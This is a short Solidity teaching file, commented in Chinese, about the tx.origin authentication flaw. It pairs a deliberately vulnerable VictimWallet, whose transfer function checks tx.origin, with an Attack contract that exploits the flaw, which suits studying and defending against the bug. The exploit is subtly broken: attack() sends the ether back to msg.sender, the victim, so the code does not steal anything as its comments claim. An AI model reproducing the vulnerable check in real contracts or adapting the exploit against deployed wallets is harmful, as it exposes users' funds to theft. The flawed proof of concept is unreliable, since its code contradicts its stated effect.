// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

// 受害合约：用 tx.origin 做身份验证
// 用 tx.origin 做身份验证会被中间合约调用欺骗，盗取资产。
// 用 msg.sender 做身份验证不会被中间合约调用欺骗，不会被盗取资产。
contract VictimWallet {
    address public owner;
    constructor() { owner = tx.origin; }

    function transfer(address payable _to, uint256 _amount) public {
        require(tx.origin == owner, "Not owner");  // 危险！
        (bool success, ) = _to.call{value: _amount}("");
        require(success, "ETH transfer failed");
    }
}

contract Attack {
    VictimWallet wallet;
    constructor(address _victim) { wallet = VictimWallet(_victim); }

    function attack() public {
        // 受害者调用 attack() → msg.sender 是受害者
        // 但 tx.origin 仍是受害者 → 通过身份验证
        wallet.transfer(payable(msg.sender), 1 ether);
    }
}